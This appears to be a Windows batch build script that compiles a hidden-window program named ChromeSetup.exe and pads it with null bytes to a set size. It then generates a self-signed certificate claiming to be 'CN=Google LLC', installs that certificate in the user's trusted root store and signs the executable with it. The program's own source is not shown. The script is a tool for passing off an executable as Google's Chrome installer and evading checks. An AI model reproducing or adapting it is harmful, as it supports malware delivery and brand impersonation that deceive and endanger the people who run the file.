@echo off
chcp 866 >nul
setlocal

:: ==============================
::   CHANGE SIZE HERE (in bytes)
:: ==============================
set TARGET_SIZE=13283768
:: 50 MB = 52428800
:: 30 MB = 31457280
:: 100 MB = 104857600
:: ==============================

echo [1/4] Compiling resources...
windres resource.rc -O coff -o resource.o
if errorlevel 1 (
    echo ERROR: resource.rc failed
    pause
    exit /b 1
)

echo [2/4] Compiling program...
g++ main.cpp resource.o -o ChromeSetup.exe -ladvapi32 -mwindows
if errorlevel 1 (
    echo ERROR: main.cpp failed
    pause
    exit /b 1
)

echo [3/4] Setting exact size to %TARGET_SIZE% bytes...
powershell -NoProfile -Command ^
    "$target = %TARGET_SIZE%;" ^
    "$f = 'ChromeSetup.exe';" ^
    "$cur = (Get-Item $f).Length;" ^
    "if ($cur -lt $target) {" ^
    "    $pad = $target - $cur;" ^
    "    $fs = [System.IO.File]::Open($f, 'Append');" ^
    "    $fs.Write((New-Object byte[] $pad), 0, $pad);" ^
    "    $fs.Close();" ^
    "    Write-Host 'Success! Final size:' $target 'bytes';" ^
    "} else {" ^
    "    Write-Host 'File is already bigger or equal';" ^
    "}"

echo [4/4] Generating certificate and signing ChromeSetup.exe...
powershell -NoProfile -Command ^
    "$cert = New-SelfSignedCertificate -CertStoreLocation Cert:\CurrentUser\My -Subject 'CN=Google LLC' -Type CodeSigningCert -HashAlgorithm SHA256;" ^
    "Export-Certificate -Cert $cert -FilePath '$env:TEMP\cert.crt' | Out-Null;" ^
    "Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation Cert:\CurrentUser\Root | Out-Null;" ^
    "$exePath = Join-Path $PSScriptRoot 'ChromeSetup.exe';" ^
    "Set-AuthenticodeSignature -FilePath $exePath -Certificate (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert | Where-Object {$_.Subject -eq 'CN=Google LLC'})[0] -TimestampServer 'http://timestamp.digicert.com'"

echo.
echo ==============================
echo   DONE! File: ChromeSetup.exe (Signed)
echo ==============================
timeout /t 5
exit
